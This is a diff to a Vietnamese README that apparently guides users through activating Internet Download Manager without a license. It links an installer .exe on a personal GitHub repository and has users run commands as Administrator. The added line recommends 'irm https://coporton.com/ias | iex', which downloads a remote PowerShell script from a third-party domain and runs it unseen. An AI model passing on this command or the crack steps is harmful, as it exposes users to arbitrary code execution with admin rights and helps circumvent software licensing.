@@ -5,7 +5,7 @@ QR ngân hàng nếu quí khách có lòng hảo tâm, ủng hộ người soạ
 
 ![image](https://github.com/user-attachments/assets/5eb77be1-b312-4d0c-a5c0-ebc451629ac2)
 
-- Đầu tiên bạn download bản IDM dùng thử từ [trang chủ](https://www.internetdownloadmanager.com) hoặc [tại đây](https://raw.githubusercontent.com/bschithanh/nguon/main/idman642build27.exe) về cài đặt bình thường, cài xong tắt tất cả IDM đang chạy.
+- Đầu tiên bạn download bản IDM dùng thử từ [trang chủ](https://www.internetdownloadmanager.com) hoặc [tại đây](https://raw.githubusercontent.com/bschithanh/nguon/main/idman642build27.exe) về cài đặt bình thường, cài xong tắt tất cả IDM đang chạy (Thường dùng câu lệnh **irm https://coporton.com/ias | iex** là rất hiệu quả)
 - Kích hoạt thông qua **Windows PowerShell** hoặc **cmd**
 - Bạn chạy **cmd** bằng quyền **Run as Administrator** sau đó copy đoạn code sau đây dán vào và nhấn **Enter**
   
